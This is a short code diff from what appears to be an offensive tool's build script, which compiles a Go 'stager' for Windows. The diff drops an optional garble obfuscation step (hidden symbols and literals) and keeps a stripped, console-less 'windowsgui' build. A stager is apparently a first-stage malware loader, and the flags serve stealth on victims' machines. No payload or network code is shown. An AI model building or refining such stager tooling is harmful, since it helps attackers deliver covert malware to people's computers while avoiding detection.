@@ -260,41 +260,18 @@ def stage_compile_stager(stager_dir, output_name):
     env["GOARCH"] = "amd64"
     env["CGO_ENABLED"] = "0"
 
-    # Try garble first for obfuscated compilation
-    use_garble = False
-    try:
-        r = subprocess.run(["garble", "version"], capture_output=True)
-        use_garble = r.returncode == 0
-    except FileNotFoundError:
-        pass
-
-    compiler = "go build"
-    if use_garble:
-        log("Compiling stager with garble (symbols + literals obfuscated)...")
-        build = subprocess.run(
-            ["garble", "-literals", "-tiny", "build",
-             "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
-            cwd=stager_dir, capture_output=True, text=True, env=env
-        )
-        if build.returncode != 0:
-            log("garble failed (likely Go version mismatch), falling back to go build...", "WARN")
-            use_garble = False
-
-    if not use_garble:
-        if not compiler:
-            log("garble not found, compiling with go build...")
-        build = subprocess.run(
-            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
-            cwd=stager_dir, capture_output=True, text=True, env=env
-        )
+    log("Compiling stager (stripped, windowsgui)...")
+    build = subprocess.run(
+        ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
+        cwd=stager_dir, capture_output=True, text=True, env=env
+    )
 
     if build.returncode != 0:
         raise Exception(f"Stager build failed:\n{build.stderr}")
 
     if os.path.exists(out_path):
         size = os.path.getsize(out_path)
-        compiler = "garble" if use_garble else "go build"
-        log(f"SUCCESS: {output_name} ({size:,} bytes) [{compiler}]", "OK")
+        log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
     else:
         log("Stager binary not found after build", "ERR")
 
